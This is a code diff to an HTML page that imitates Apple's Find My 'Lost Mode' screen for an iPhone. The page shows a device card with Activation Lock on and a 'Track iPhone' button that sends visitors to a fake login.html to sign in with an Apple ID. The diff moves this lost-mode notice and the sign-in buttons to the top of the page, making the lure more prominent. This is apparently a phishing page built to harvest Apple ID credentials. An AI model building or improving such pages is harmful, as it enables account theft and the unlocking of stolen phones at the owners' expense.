@@ -34,7 +34,16 @@ h1 span{display:block;font-size:15px;font-weight:400;color:var(--muted);letter-s
 .pulse::after{animation-delay:1.05s}
 .pulse b{position:absolute;inset:5px;border-radius:50%;background:#0071e3;border:2px solid #fff;box-shadow:0 1px 5px rgba(0,0,0,.35)}
 @keyframes ring{0%{transform:scale(.55);opacity:.95}70%{opacity:0}100%{transform:scale(2.7);opacity:0}}
-.sect{margin-top:22px}
+.lost{display:flex;gap:11px;background:#fff;border-radius:16px;padding:14px 15px;margin-top:18px;box-shadow:0 1px 3px rgba(0,0,0,.05)}
+.lost .ic{width:28px;height:28px;border-radius:50%;background:#fff3e0;display:grid;place-items:center;flex:none}
+.lost .ic svg{width:15px;height:15px;fill:#c26a00}
+.lost p{margin:0;font-size:14px;line-height:1.45;color:var(--muted)}
+.lost p b{color:var(--fg);font-weight:600;display:block;margin-bottom:2px}
+.btn{display:flex;align-items:center;justify-content:center;gap:9px;width:100%;height:52px;margin-top:18px;background:var(--blue);color:#fff;border:0;border-radius:13px;font-size:17px;font-weight:500;font-family:inherit;text-decoration:none;transition:opacity .15s}
+.btn:active{opacity:.78}
+.btn svg{width:17px;height:17px;fill:#fff}
+.alt{display:block;text-align:center;margin-top:14px;font-size:14px;color:var(--blue);text-decoration:none}
+.sect{margin-top:26px}
 .h{font-size:12px;font-weight:600;text-transform:uppercase;letter-spacing:.06em;color:var(--muted);padding:0 6px 8px}
 .card{background:var(--card);border-radius:16px;overflow:hidden}
 .row{display:flex;justify-content:space-between;gap:14px;padding:12px 16px;border-bottom:1px solid var(--line);font-size:14px}
@@ -42,12 +51,6 @@ h1 span{display:block;font-size:15px;font-weight:400;color:var(--muted);letter-s
 .row .k{color:var(--muted);flex:none}
 .row .v{font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:13px;text-align:right;word-break:break-all}
 .row .v.ok{color:#1c7c33;font-family:inherit;font-size:14px;font-weight:500}
-.note{background:var(--card);border-radius:16px;padding:15px 16px;margin-top:22px;font-size:14px;line-height:1.5;color:var(--muted)}
-.note b{color:var(--fg);font-weight:600}
-.btn{display:flex;align-items:center;justify-content:center;gap:9px;width:100%;height:52px;margin-top:24px;background:var(--blue);color:#fff;border:0;border-radius:13px;font-size:17px;font-weight:500;font-family:inherit;text-decoration:none;transition:opacity .15s}
-.btn:active{opacity:.78}
-.btn svg{width:17px;height:17px;fill:#fff}
-.alt{display:block;text-align:center;margin-top:16px;font-size:14px;color:var(--blue);text-decoration:none}
 .foot{margin-top:26px;font-size:11.5px;color:#86868b;text-align:center;line-height:1.65}
 .leaflet-control-attribution{font-size:9px!important;background:rgba(255,255,255,.8)!important}
 .leaflet-container{font-family:inherit}
@@ -78,6 +81,17 @@ h1 span{display:block;font-size:15px;font-weight:400;color:var(--muted);letter-s
     </div>
   </div>
 
+  <div class="lost">
+    <div class="ic"><svg viewBox="0 0 24 24"><path d="M12 2a7 7 0 00-7 7v3a3 3 0 003 3h1v5a1 1 0 002 0v-5h2v5a1 1 0 002 0v-5h1a3 3 0 003-3V9a7 7 0 00-7-7zm-3.5 8.5a1.5 1.5 0 111.5-1.5 1.5 1.5 0 01-1.5 1.5zm7 0A1.5 1.5 0 1117 9a1.5 1.5 0 01-1.5 1.5z"/></svg></div>
+    <p><b>Lost Mode is on</b>This iPhone has been marked as lost by the owner. Sign in with the linked Apple ID to see its live location.</p>
+  </div>
+
+  <a class="btn" href="login.html">
+    <svg viewBox="0 0 24 24"><path d="M21.7 11.3l-8.5-8.5a1 1 0 00-1.4 1.4l6.8 6.8H3a1 1 0 000 2h15.6l-6.8 6.8a1 1 0 101.4 1.4l8.5-8.5a1 1 0 000-1.4z"/></svg>
+    Track iPhone
+  </a>
+  <a class="alt" href="login.html">Not your iPhone? Sign in with another Apple ID</a>
+
   <div class="sect">
     <div class="h">Device</div>
     <div class="card">
@@ -89,14 +103,6 @@ h1 span{display:block;font-size:15px;font-weight:400;color:var(--muted);letter-s
       <div class="row"><span class="k">Apple ID Lock</span><span class="v ok">Activation Lock On</span></div>
     </div>
   </div>
-
-  <div class="note"><b>This iPhone has been marked as lost.</b> Sign in with the Apple ID linked to this device to view its live location and contact the owner.</div>
-
-  <a class="btn" href="login.html">
-    <svg viewBox="0 0 24 24"><path d="M21.7 11.3l-8.5-8.5a1 1 0 00-1.4 1.4l6.8 6.8H3a1 1 0 000 2h15.6l-6.8 6.8a1 1 0 101.4 1.4l8.5-8.5a1 1 0 000-1.4z"/></svg>
-    Track iPhone
-  </a>
-  <a class="alt" href="login.html">Not your iPhone? Sign in with another Apple ID</a>
 
   <p class="foot">Location is approximate and updated every few minutes.<br>Apple ID, iCloud and Find My are services of Apple Inc.</p>
 </div>
